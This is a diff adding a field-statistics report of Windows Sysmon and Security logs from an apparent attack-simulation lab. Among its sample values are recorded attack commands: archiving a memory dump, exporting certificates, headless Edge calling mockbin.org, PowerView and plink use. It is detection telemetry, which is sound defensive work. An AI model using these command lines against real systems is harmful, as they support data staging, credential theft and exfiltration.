@@ -1,0 +1,1737 @@
+
+Processing Statistics:
+======================
+Total lines scanned: 3240694
+Successfully processed: 2991280
+Skipped lines: 249414
+Success rate: 92.30%
+
+
+Data Elements Report:
+====================
+
+UtcTime (seen 2411959 times)
+  Sample values:
+    - 2024-09-24 10:07:19.930
+    - 2024-09-24 09:37:16.912
+    - 2024-09-24 09:36:55.328
+    - 2024-09-24 09:33:56.764
+    - 2023-09-11 19:10:15.400
+
+RuleName (seen 2411768 times)
+  Sample values:
+    - -
+    - DLL
+    - EXE
+    - T1053
+    - InvDB
+
+SourceProcessId (seen 1471618 times)
+  Sample values:
+    - 844
+    - 5836
+    - 1704
+    - 3168
+    - 412
+
+SourceImage (seen 1471618 times)
+  Sample values:
+    - C:\Windows\system32\svchost.exe
+    - C:\Windows\explorer.exe
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
+    - C:\Windows\system32\conhost.exe
+    - C:\Windows\system32\csrss.exe
+
+TargetProcessId (seen 1471618 times)
+  Sample values:
+    - 6840
+    - 6112
+    - 6816
+    - 3716
+    - 1704
+
+TargetImage (seen 1471618 times)
+  Sample values:
+    - C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
+    - C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
+    - C:\Program Files\Mozilla Firefox\firefox.exe
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
+
+SourceProcessGUID (seen 1471496 times)
+  Sample values:
+    - {761B69BB-818C-607D-0C00-00000000BA01}
+    - {761B69BB-88A9-6081-637F-00000000BA01}
+    - {21761711-C16C-6081-B487-00000000BB01}
+    - {21761711-842B-607D-9B00-00000000BB01}
+    - {21761711-83AC-607D-0500-00000000BB01}
+
+SourceThreadId (seen 1471496 times)
+  Sample values:
+    - 972
+    - 5856
+    - 1708
+    - 3556
+    - 976
+
+TargetProcessGUID (seen 1471496 times)
+  Sample values:
+    - {761B69BB-88AA-6081-647F-00000000BA01}
+    - {761B69BB-88AA-6081-657F-00000000BA01}
+    - {761B69BB-A4A5-607D-9A08-00000000BA01}
+    - {21761711-842A-607D-9700-00000000BB01}
+    - {21761711-C16C-6081-B487-00000000BB01}
+
+GrantedAccess (seen 1471496 times)
+  Sample values:
+    - 0x3600
+    - 0x40
+    - 0x101400
+    - 0x1fffff
+    - 0x1000
+
+CallTrace (seen 1471496 times)
+  Sample values:
+    - C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\SYSTEM32\psmserviceexthost.dll+966a|C:\Windows\SYSTEM32\psmserviceexthost.dll+776e|C:\Windows\SYSTEM32\psmserviceexthost.dll+3479f|C:\Windows\SYSTEM32\psmserviceexthost.dll+32739|C:\Windows\SYSTEM32\psmserviceexthost.dll+22de9|C:\Windows\SYSTEM32\psmserviceexthost.dll+1ee24|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781
+    - C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\System32\KERNELBASE.dll+221bd|C:\Windows\System32\SHCORE.dll+64c8|C:\Windows\System32\SHCORE.dll+6497|C:\Windows\System32\SHCORE.dll+6387|C:\Windows\System32\SHCORE.dll+62fd|C:\Windows\System32\SHCORE.dll+620a|C:\Windows\System32\SHELL32.dll+55a30|C:\Windows\System32\USER32.dll+121e4|C:\Windows\System32\USER32.dll+11ed7|C:\Windows\System32\USER32.dll+22a53|C:\Windows\SYSTEM32\ntdll.dll+a9814|UNKNOWN(FFFFF803D54D48C8)|UNKNOWN(FFFFF288E7234A38)|UNKNOWN(FFFFF288E7234BB7)|UNKNOWN(FFFFF288E722F241)|UNKNOWN(FFFFF288E7230C0A)|UNKNOWN(FFFFF288E722EEC6)|UNKNOWN(FFFFF803D51EBE03)|C:\Windows\System32\win32u.dll+10c4|C:\Windows\System32\USER32.dll+1ea2e|C:\Windows\System32\SHELL32.dll+5929b|C:\Windows\System32\SHELL32.dll+dac5a|C:\Windows\System32\SHCORE.dll+33fad
+    - C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\System32\KERNELBASE.dll+221bd|C:\Windows\System32\SHCORE.dll+64c8|C:\Windows\System32\SHCORE.dll+1c0e5|C:\Windows\System32\SHELL32.dll+55511|C:\Windows\System32\USER32.dll+121e4|C:\Windows\System32\USER32.dll+11ed7|C:\Windows\System32\USER32.dll+22a53|C:\Windows\SYSTEM32\ntdll.dll+a9814|UNKNOWN(FFFFF803D54D48C8)|UNKNOWN(FFFFF288E7234A38)|UNKNOWN(FFFFF288E7234BB7)|UNKNOWN(FFFFF288E722F241)|UNKNOWN(FFFFF288E7230C0A)|UNKNOWN(FFFFF288E722EEC6)|UNKNOWN(FFFFF803D51EBE03)|C:\Windows\System32\win32u.dll+10c4|C:\Windows\System32\USER32.dll+1ea2e|C:\Windows\System32\SHELL32.dll+5929b|C:\Windows\System32\SHELL32.dll+dac5a|C:\Windows\System32\SHCORE.dll+33fad|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781
+    - C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\System32\KERNELBASE.dll+221bd|C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe+6025c5|C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe+6020f6|C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe+59e67|C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe+5b88c|C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe+8e7d70|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781
+    - C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\SYSTEM32\ConhostV2.dll+5c07|C:\Windows\SYSTEM32\ConhostV2.dll+76ab|C:\Windows\SYSTEM32\ConhostV2.dll+a84c|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781
+
+ProcessId (seen 943244 times)
+  Sample values:
+    - 1176
+    - 5892
+    - 5144
+    - 5828
+    - 9892
+
+ProcessGuid (seen 939695 times)
+  Sample values:
+    - {F4BF863A-8F57-66F2-C5CD-000000001403}
+    - {F4BF863A-884B-66F2-13CD-000000001403}
+    - {F4BF863A-8835-66F2-04CD-000000001403}
+    - {F4BF863A-8783-66F2-E6CC-000000001403}
+    - {EF490992-6617-64FF-34CB-01000000DE02}
+
+Image (seen 939695 times)
+  Sample values:
+    - C:\Python311\python.exe
+    - C:\Users\Administrator\Downloads\10tymonth-main_2\10tymonth-main\python.exe
+    - C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+    - C:\Program Files\WinRAR\Rar.exe
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunk-winevtlog.exe
+
+Hashes (seen 600824 times)
+  Sample values:
+    - MD5=86E2284C8AB340D17BECC6BDFC889198,SHA256=DC4E8127DC7801D5D92C9446E852F0262E4B63CE2B1AE459573BEED0E85A3A14
+    - MD5=F7C0C38BDF23992FC92CA8A55AFA28F2,SHA256=A9CEC009503D067F241B5EDDAEA4E42C38EDCB0B57C1B46E946C5281B7F1EA21,IMPHASH=46D4A991088E70ACDA923A7CD0F9AA4C
+    - MD5=C02E12FB03EF6112CDFB4D6CA318B771,SHA256=39101A4D17F0DF69EDDF5380FFD30358E7F204524603D3F117E9D54738E2B94E
+    - MD5=D12A581DEA0EF46B6F8EB41C0C06E082,SHA256=F6904FBC2EC53CBBB778D10A1E27CE6F60AB97770FE7B81CC11AC8EABC32D27F,IMPHASH=00000000000000000000000000000000
+    - MD5=1A07469E95D5DF2F9DD7629F72E0698E,SHA256=3BA8060D44DBBDC2ED6A08CBD3912ED698BCA8BA130040E74665EB70FCABBCF3,IMPHASH=00000000000000000000000000000000
+
+User (seen 563478 times)
+  Sample values:
+    - TESTLAB-WIN-2\Administrator
+    - MSWIN-SERVER\Administrator
+    - ATTACKRANGE\Administrator
+    - NT AUTHORITY\SYSTEM
+    - NT AUTHORITY\LOCAL SERVICE
+
+TargetFilename (seen 442411 times)
+  Sample values:
+    - C:\Users\Administrator\AppData\Local\Temp\2\screenshot.png
+    - C:\Users\ADMINI~1\AppData\Local\Temp\2\US 13.52.167.115 9h37m15s-24-9-2024.zip
+    - C:\Users\ADMINI~1\AppData\Local\Temp\2\US 13.52.167.115 9h36m53s-24-9-2024.zip
+    - C:\Users\ADMINI~1\AppData\Local\Temp\2\US 13.52.167.115 9h33m55s-24-9-2024.zip
+    - C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\modinputs\WinEventLog\Microsoft-Windows-Sysmon_Operational
+
+IsExecutable (seen 367730 times)
+  Sample values:
+    - false
+    - true
+
+Archived (seen 367271 times)
+  Sample values:
+    - false - insufficient disk space
+    - true
+    - false - rename failed with status 0xc000000d
+    - false - rename failed with status 0xc0000022
+    - false - shredded file with pattern 0x00
+
+FileVersion (seen 232613 times)
+  Sample values:
+    - 116.0.1938.76
+    - 6.24.0
+    - 10.0.14321.1024 (debuggers(dbg).210127-1811)
+    - 10.0.14321.1024 (rs1_release.160715-1616)
+    - 10.0.14393.0 (rs1_release.160715-1616)
+
+Description (seen 232613 times)
+  Sample values:
+    - Microsoft Edge
+    - Command line RAR
+    - Windows Core Debugging Helpers
+    - Windows Image Helper
+    - Base cryptographic API DLL
+
+Product (seen 232613 times)
+  Sample values:
+    - Microsoft Edge
+    - WinRAR
+    - Microsoft® Windows® Operating System
+    - Microsoft® Visual Studio® 2017
+    - -
+
+Company (seen 232613 times)
+  Sample values:
+    - Microsoft Corporation
+    - Alexander Roshal
+    - Microsoft
+    - -
+    - The OpenSSL Project, http://www.openssl.org/
+
+OriginalFileName (seen 232613 times)
+  Sample values:
+    - msedge.exe
+    - -
+    - DBGCORE.DLL
+    - DBGHELP.DLL
+    - cryptbase.dll
+
+ImageLoaded (seen 161044 times)
+  Sample values:
+    - C:\Windows\System32\dbgcore.dll
+    - C:\Windows\System32\dbghelp.dll
+    - C:\Windows\System32\cryptbase.dll
+    - C:\Windows\System32\rsaenh.dll
+    - C:\Windows\System32\cryptsp.dll
+
+Signed (seen 161044 times)
+  Sample values:
+    - true
+    - false
+
+Signature (seen 161044 times)
+  Sample values:
+    - Microsoft Windows
+    - Microsoft Corporation
+    - Splunk, Inc.
+    - -
+    - Simon Tatham
+
+SignatureStatus (seen 161044 times)
+  Sample values:
+    - Valid
+    - Unavailable
+
+EventType (seen 136365 times)
+  Sample values:
+    - ConnectPipe
+    - CreatePipe
+    - CreateKey
+    - SetValue
+    - DeleteKey
+
+TargetObject (seen 122730 times)
+  Sample values:
+    - HKU\S-1-5-21-3386589612-1946705271-3951022823-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections
+    - HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad
+    - HKLM\System\CurrentControlSet\Services\DFSR\Parameters\Volumes\BD98497A-0000-0000-0000-100000000000\Volume Configuration File
+    - HKLM\System\CurrentControlSet\Services\DFSR\Parameters\Replication Groups\59F158BB-F4A4-42E1-B81F-FD8310C406A3\Config Source
+    - HKLM\System\CurrentControlSet\Services\DFSR\Parameters\Replication Groups\59F158BB-F4A4-42E1-B81F-FD8310C406A3\Replica Set Configuration File
+
+Protocol (seen 112280 times)
+  Sample values:
+    - tcp
+    - udp
+
+Initiated (seen 112280 times)
+  Sample values:
+    - true
+    - false
+
+SourceIsIpv6 (seen 112280 times)
+  Sample values:
+    - false
+    - true
+
+SourceIp (seen 112280 times)
+  Sample values:
+    - 10.0.1.14
+    - 10.0.1.15
+    - 0:0:0:0:0:0:0:1
+    - fe80:0:0:0:118f:34ac:1322:c17e
+    - 169.254.255.255
+
+SourceHostname (seen 112280 times)
+  Sample values:
+    - win-dc-982.attackrange.local
+    - win-host-5.attackrange.local
+    - -
+    - ip-10-0-1-15.us-west-2.compute.internal
+    - win-dc-233.attackrange.local
+
+SourcePort (seen 112280 times)
+  Sample values:
+    - 22331
+    - 22332
+    - 50720
+    - 22333
+    - 50721
+
+SourcePortName (seen 112280 times)
+  Sample values:
+    - -
+    - domain
+    - netbios-dgm
+    - dhcpv6-client
+    - ntp
+
+DestinationIsIpv6 (seen 112280 times)
+  Sample values:
+    - false
+    - true
+
+DestinationIp (seen 112280 times)
+  Sample values:
+    - 10.0.1.12
+    - 34.218.235.219
+    - 0:0:0:0:0:0:0:1
+    - fe80:0:0:0:118f:34ac:1322:c17e
+    - 10.0.1.14
+
+DestinationHostname (seen 112280 times)
+  Sample values:
+    - -
+    - ec2-34-218-235-219.us-west-2.compute.amazonaws.com
+    - ip-10-0-1-12.us-west-2.compute.internal
+    - win-dc-982.attackrange.local
+    - ip-10-0-1-15.us-west-2.compute.internal
+
+DestinationPort (seen 112280 times)
+  Sample values:
+    - 8000
+    - 443
+    - 389
+    - 8089
+    - 445
+
+DestinationPortName (seen 112280 times)
+  Sample values:
+    - -
+    - https
+    - ldap
+    - microsoft-ds
+    - epmap
+
+CreationUtcTime (seen 74678 times)
+  Sample values:
+    - 2024-09-24 10:07:19.930
+    - 2024-09-24 09:37:16.912
+    - 2024-09-24 09:36:55.328
+    - 2024-09-24 09:33:56.764
+    - 2021-04-19 13:21:25.072
+
+CommandLine (seen 73957 times)
+  Sample values:
+    - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --noerrdialogs --mojo-platform-channel-handle=5636 --field-trial-handle=1644,i,8443704113184521901,11956835959340022079,262144 --disable-features=PaintHolding /prefetch:8
+    - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --noerrdialogs --mojo-platform-channel-handle=5324 --field-trial-handle=1644,i,8443704113184521901,11956835959340022079,262144 --disable-features=PaintHolding /prefetch:8
+    - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --noerrdialogs --mojo-platform-channel-handle=5164 --field-trial-handle=1644,i,8443704113184521901,11956835959340022079,262144 --disable-features=PaintHolding /prefetch:8
+    - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --noerrdialogs --mojo-platform-channel-handle=5144 --field-trial-handle=1644,i,8443704113184521901,11956835959340022079,262144 --disable-features=PaintHolding /prefetch:8
+    - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --noerrdialogs --mojo-platform-channel-handle=4324 --field-trial-handle=1644,i,8443704113184521901,11956835959340022079,262144 --disable-features=PaintHolding /prefetch:8
+
+LogonGuid (seen 72840 times)
+  Sample values:
+    - {EF490992-4815-64F7-0CA6-190000000000}
+    - {F3BFD260-1F25-655F-A0DF-140000000000}
+    - {21761711-83AD-607D-E703-000000000000}
+    - {761B69BB-818A-607D-E703-000000000000}
+    - {21761711-84C7-607D-C8E0-090000000000}
+
+CurrentDirectory (seen 71997 times)
+  Sample values:
+    - C:\Program Files (x86)\Microsoft\Edge\Application\116.0.1938.76\
+    - C:\Program Files (x86)\Microsoft\Edge\Application\
+    - C:\Users\Administrator\Desktop\11719307473\749533eef943e019e1f6ccf61f36cc0939f7aa0c730bac84467d83441a0584f0~\
+    - C:\Temp\
+    - C:\Windows\system32\
+
+LogonId (seen 71997 times)
+  Sample values:
+    - 0x19a60c
+    - 0x14dfa0
+    - 0x3e7
+    - 0x9e0c8
+    - 0x3a9842
+
+TerminalSessionId (seen 71997 times)
+  Sample values:
+    - 2
+    - 0
+    - 1
+    - 3
+    - 80
+
+IntegrityLevel (seen 71997 times)
+  Sample values:
+    - Low
+    - High
+    - System
+    - Medium
+    - AppContainer
+
+ParentProcessGuid (seen 71997 times)
+  Sample values:
+    - {EF490992-6613-64FF-1FCB-01000000DE02}
+    - {EF490992-DCBF-64F9-0352-00000000DE02}
+    - {EF490992-6607-64FF-05CB-01000000DE02}
+    - {EF490992-DCA0-64F9-E751-00000000DE02}
+    - {EF490992-64C4-64FF-C1CA-01000000DE02}
+
+ParentProcessId (seen 71997 times)
+  Sample values:
+    - 7812
+    - 6348
+    - 10956
+    - 6548
+    - 7976
+
+ParentImage (seen 71997 times)
+  Sample values:
+    - C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+    - C:\Windows\System32\cmd.exe
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
+    - C:\Users\Administrator\Documents\7z.exe
+    - C:\Windows\SysWOW64\rundll32.exe
+
+ParentCommandLine (seen 71997 times)
+  Sample values:
+    - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"  --headless=new --disable-gpu https://mockbin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709
+    - C:\Windows\system32\cmd.exe /c ""C:\ProgramData\b207a288-3e1f-42cc-baed-709385117200.bat" "
+    - C:\Windows\system32\cmd.exe /c ""C:\Temp\1.bat" "
+    - "C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe" service
+    - C:\Users\Administrator\Documents\7z.exe a -v500m -mx9 -r0 .\file1.zip
+
+Details (seen 57826 times)
+  Sample values:
+    - \\.\C:\System Volume Information\DFSR\Config\Volume_BD98497A-0000-0000-0000-100000000000.XML
+    - DWORD (0x00000001)
+    - \\?\C:\System Volume Information\DFSR\Config\Replica_59F158BB-F4A4-42E1-B81F-FD8310C406A3.XML
+    - DWORD (0x00000006)
+    - QWORD (0x00000000-0x10939ba5)
+
+SourceUser (seen 18392 times)
+  Sample values:
+    - ATTACKRANGE\Administrator
+    - NT AUTHORITY\SYSTEM
+    - NT AUTHORITY\NETWORK SERVICE
+    - AR-WIN-5\Administrator
+    - ATTACKBOX-WIN10\attacker
+
+TargetUser (seen 18392 times)
+  Sample values:
+    - ATTACKRANGE\Administrator
+    - NT AUTHORITY\NETWORK SERVICE
+    - NT AUTHORITY\SYSTEM
+    - Window Manager\DWM-2
+    - NT AUTHORITY\LOCAL SERVICE
+
+QueryName (seen 14436 times)
+  Sample values:
+    - win-host-5
+    - www.win-rar.com
+    - r3.o.lencr.org
+    - crl.identrust.com
+    - notifier.win-rar.com
+
+QueryStatus (seen 14436 times)
+  Sample values:
+    - 0
+    - 9501
+    - 9003
+    - 1460
+    - 9002
+
+QueryResults (seen 14436 times)
+  Sample values:
+    - 10.0.1.15;
+    - type:  5 win-rar.com;::ffff:51.195.68.163;
+    - type:  5 o.lencr.edgesuite.net;type:  5 a1887.dscq.akamai.net;::ffff:23.221.223.11;::ffff:23.221.223.26;
+    - type:  5 identrust.edgesuite.net;type:  5 a1952.dscq.akamai.net;::ffff:23.59.188.104;::ffff:23.59.188.112;
+    - ::ffff:51.195.68.173;
+
+PipeName (seen 13608 times)
+  Sample values:
+    - \srvsvc
+    - \wkssvc
+    - <Anonymous Pipe>
+    - \lsass
+    - \PSHost.132610961626030688.6204.DefaultAppDomain.powershell
+
+ParentUser (seen 13408 times)
+  Sample values:
+    - MSWIN-SERVER\Administrator
+    - ATTACKRANGE\Administrator
+    - NT AUTHORITY\SYSTEM
+    - ATTACKBOX-WIN10\VICTIM
+    - -
+
+ScriptBlockId (seen 13085 times)
+  Sample values:
+    - cabe33eb-48a9-4b9b-815b-4c58d349b8ee
+    - 599534bc-6499-4867-8918-5c7e29427dee
+    - 4ffa90da-6fa1-4536-bcd7-7116b097c649
+    - 7446534e-570a-40c6-8861-2f8a8ba2a644
+    - aa3de072-a3cd-4890-9054-d458e80716d8
+
+RunspaceId (seen 12696 times)
+  Sample values:
+    - 54264437-4f42-4df9-8829-9527f33cd4fe
+    - 0c4de2aa-fcf4-4ae3-b969-71a70be52b57
+    - 532a042a-a474-4266-9336-27bf9afee494
+    - bc087cb4-e618-4961-92c6-eee5f0231abc
+    - a93a0f5d-dd2b-4bad-82c1-4a084022e47a
+
+TargetUserName (seen 4493 times)
+  Sample values:
+    - -
+    - administrator
+    - Administrator
+    - victim_admin_user
+    - SYSTEM
+
+SubjectUserSid (seen 4315 times)
+  Sample values:
+    - MSWIN-SERVER\Administrator
+    - ATTACKRANGE\Administrator
+    - NT AUTHORITY\SYSTEM
+    - NAS\Administrator
+    - AR-WIN\Administrator
+
+SubjectUserName (seen 4315 times)
+  Sample values:
+    - Administrator
+    - administrator
+    - WIN-DC-MHAAG-AT$
+    - VICTIM-PC$
+    - -
+
+SubjectDomainName (seen 4315 times)
+  Sample values:
+    - MSWIN-SERVER
+    - ATTACKRANGE
+    - NAS
+    - AR-WIN
+    - TESTLAB-WIN-2
+
+SubjectLogonId (seen 4315 times)
+  Sample values:
+    - 0x19a60c
+    - 0x14dfa0
+    - 0x1cfe16
+    - 0x3e7
+    - 0x6051a
+
+TargetDomainName (seen 4282 times)
+  Sample values:
+    - -
+    - ATTACKRANGE
+    - TESTLAB-WIN-2
+    - attack_range
+    - NT AUTHORITY
+
+TargetUserSid (seen 3087 times)
+  Sample values:
+    - NULL SID
+    - ATTACKRANGE\Administrator
+    - NT AUTHORITY\SYSTEM
+    - VICTIM-PC\VICTIM
+    - S-1-5-21-4169047311-3500417063-4159824177-500
+
+param1 (seen 2935 times)
+  Sample values:
+    - Microsoft Passport
+    - Cisco Security Connector Monitoring 8.4.2
+    - Cisco Secure Endpoint 8.4.2
+    - Cisco AMP Orbital
+    - 1344
+
+param2 (seen 2935 times)
+  Sample values:
+    - stopped
+    - running
+    - DefaultAppDomain
+    - disabled
+    - demand start
+
+TargetLogonId (seen 2646 times)
+  Sample values:
+    - 0x0
+    - 0x1cfe16
+    - 0x3e7
+    - 0xb0c9c6
+    - 0xb0c90d
+
+NewProcessId (seen 1960 times)
+  Sample values:
+    - 0x2618
+    - 0x2ad0
+    - 0x16c0
+    - 0x28d0
+    - 0x28c0
+
+NewProcessName (seen 1960 times)
+  Sample values:
+    - C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+    - C:\Program Files\WinRAR\Rar.exe
+    - C:\Users\Administrator\Downloads\plink.exe
+    - C:\Windows\System32\cmd.exe
+    - C:\Windows\System32\conhost.exe
+
+TokenElevationType (seen 1960 times)
+  Sample values:
+    - %%1936
+    - %%1938
+    - %%1937
+
+ParentProcessName (seen 1958 times)
+  Sample values:
+    - C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+    - C:\Windows\System32\cmd.exe
+    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    - C:\Users\Administrator\Downloads\plink.exe
+    - C:\Windows\explorer.exe
+
+MandatoryLabel (seen 1958 times)
+  Sample values:
+    - Mandatory Label\Low Mandatory Level
+    - Mandatory Label\High Mandatory Level
+    - Mandatory Label\System Mandatory Level
+    - Mandatory Label\Medium Mandatory Level
+    - S-1-16-8192
+
+ProcessName (seen 1589 times)
+  Sample values:
+    - C:\Windows\System32\services.exe
+    - -
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+    - C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
+
+IpAddress (seen 1514 times)
+  Sample values:
+    - 192.168.1.10
+    - -
+    - ATTACKER
+    - fe80::10c7:c32d:f763:aab2
+    - 10.0.1.15
+
+IpPort (seen 1514 times)
+  Sample values:
+    - 49314
+    - -
+    - 0
+    - 51160
+    - 50067
+
+Status (seen 1445 times)
+  Sample values:
+    - 0x0
+    - 0xc000006d
+    - 0x1
+    - 0xc000013a
+    - 0x6
+
+WorkstationName (seen 1349 times)
+  Sample values:
+    - WIN-SHKRDLDI338
+    - WIN-N9RJEHRSK8P
+    - SERVER
+    - NULL
+    - B_07
+
+LogonType (seen 1127 times)
+  Sample values:
+    - 5
+    - 3
+    - 2
+    - 10
+
+TransmittedServices (seen 1114 times)
+  Sample values:
+    - -
+
+LogonProcessName (seen 862 times)
+  Sample values:
+    - Advapi
+    - NtLmSsp
+    - Kerberos
+    - seclogo
+    - User32
+
+AuthenticationPackageName (seen 862 times)
+  Sample values:
+    - Negotiate
+    - NTLM
+    - Kerberos
+    - MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
+
+LmPackageName (seen 862 times)
+  Sample values:
+    - -
+    - NTLM V2
+    - NTLM V1
+
+KeyLength (seen 862 times)
+  Sample values:
+    - 0
+    - 128
+
+TargetSid (seen 823 times)
+  Sample values:
+    - TESTLAB-WIN-2\Administrator
+    - attack_range\victim_admin_user
+    - ATTACKRANGE\lowpriv
+    - NULL SID
+    - ATTACKRANGE\REED_LARSEN
+
+PrivilegeList (seen 545 times)
+  Sample values:
+    - -
+    - SeProfileSingleProcessPrivilege
+    - SeTcbPrivilege
+    - SeSecurityPrivilege
+    - SeCreateGlobalPrivilege
+
+ServiceName (seen 514 times)
+  Sample values:
+    - krbtgt
+    - AR-WIN-DC$
+    - WIN-DC-MVELAZCO$
+    - krbtgt/attackrange.local
+    - krbtgt1
+
+UserName (seen 494 times)
+  Sample values:
+    - backup
+    - Raymond
+    - adminisnador
+    - Stanley
+    - tcaweb
+
+DomainName (seen 493 times)
+  Sample values:
+    - NULL
+    - ATTACKRANGE
+    - AR-WIN-2
+
+SChannelName (seen 487 times)
+  Sample values:
+    - VICTIM_PC
+    - NORMAL_PC1
+    - NORMAL_PC2
+    - NORMAL_PC3
+    - NORMAL_PC4
+
+SChannelType (seen 487 times)
+  Sample values:
+    - 2
+
+TicketOptions (seen 482 times)
+  Sample values:
+    - 0x40800010
+    - 0x40810010
+    - 0x60810010
+    - 0x40810000
+    - 0x40800000
+
+FailureReason (seen 441 times)
+  Sample values:
+    - %%2313
+
+SubStatus (seen 441 times)
+  Sample values:
+    - 0xc0000064
+    - 0xc000006a
+
+ServiceSid (seen 432 times)
+  Sample values:
+    - attack_range\krbtgt
+    - ATTACKRANGE\AR-WIN-DC$
+    - ATTACKRANGE\krbtgt
+    - ATTACKRANGE\WIN-DC-MVELAZCO$
+    - NULL SID
+
+TicketEncryptionType (seen 432 times)
+  Sample values:
+    - 0x12
+    - 0xffffffff
+    - 0x17
+
+ImpersonationLevel (seen 421 times)
+  Sample values:
+    - %%1833
+    - %%1840
+    - %%1832
+
+RestrictedAdminMode (seen 421 times)
+  Sample values:
+    - -
+    - %%1843
+
+TargetOutboundUserName (seen 421 times)
+  Sample values:
+    - -
+
+TargetOutboundDomainName (seen 421 times)
+  Sample values:
+    - -
+
+VirtualAccount (seen 421 times)
+  Sample values:
+    - %%1843
+
+TargetLinkedLogonId (seen 421 times)
+  Sample values:
+    - 0x0
+
+ElevatedToken (seen 421 times)
+  Sample values:
+    - %%1842
+    - %%1843
+
+Path (seen 414 times)
+  Sample values:
+    - C:\Users\reed_potts\Downloads\PowerView.ps1
+    - C:\Users\Administrator\Downloads\powerview.ps1
+    - C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Set-Wallpaper.ps1
+    - C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Get-Metadata.ps1
+    - C:\Users\research\Desktop\lsass_ASR_test.exe
+
+MessageNumber (seen 389 times)
+  Sample values:
+    - 1
+
+MessageTotal (seen 389 times)
+  Sample values:
+    - 1
+
+ScriptBlockText (seen 389 times)
+  Sample values:
+    - Compress-Archive -Path C:\Windows\MEMORY.DMP -DestinationPath C:\Temp\test.zip
+    - Compress-Archive -Path C:\Program Files\Mozilla Firefox\installation_telemetry.json -DestinationPath C:\Temp\test.zip
+    - Export-Certificate -Cert Cert:\CurrentUser\My\3E8CD9DFBF178FB09AEB263ADADBA32A6F5A0043 -FilePath c:\temp\test.ttt -Type CERT
+    - powershell.exe Export-Certificate -Cert Cert:\CurrentUser\My\3E8CD9DFBF178FB09AEB263ADADBA32A6F5A0043 -FilePath c:\temp\test.ttt -Type CERT
+    - Export-Certificate -Cert 3E8CD9DFBF178FB09AEB263ADADBA32A6F5A0043 -FilePath c:\temp\test.ttt -Type CERT
+
+SamAccountName (seen 294 times)
+  Sample values:
+    - -
+    - ESX Admins
+    - RandomGroup_vmy8v
+    - RandomGroup_at37n
+    - RandomGroup_4qekn
+
+SidHistory (seen 294 times)
+  Sample values:
+    - -
+
+ObjectServer (seen 246 times)
+  Sample values:
+    - Security
+    - NT Local Security Authority / Authentication Service
+    - LSA
+
+PreAuthType (seen 230 times)
+  Sample values:
+    - 16
+    - 2
+    - -
+    - 0
+
+CertIssuerName (seen 230 times)
+  Sample values:
+    - Attack Range Cert Authority
+
+CertSerialNumber (seen 230 times)
+  Sample values:
+    - 7F00049982010D5A76DE2C8AD0000000012345
+
+CertThumbprint (seen 230 times)
+  Sample values:
+    - F4B9F00E378950153F18C0E8C5F38DBCF1712345
+    - xyz
+
+Workstation (seen 213 times)
+  Sample values:
+    - WIN-HOST-MVELAZ
+    - AR-WIN-2
+    - [fe80::b907:7694:d740:91bb]
+
+PackageName (seen 212 times)
+  Sample values:
+    - MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
+
+Hash (seen 198 times)
+  Sample values:
+    - MD5=B24F23CBE6F0C95BAE4DBAF344FB276E,SHA256=BF83A611C6EFA6792BC4D96978F28A8267A0277C46A82F50435DDCEDDBEA0F2C
+    - MD5=41C8E38B48C792EF480A19B8A857CD36,SHA256=653EDDE8520F10019C571F25AD6E61147C06EEECCC7639F69D61D1375CC71EAA
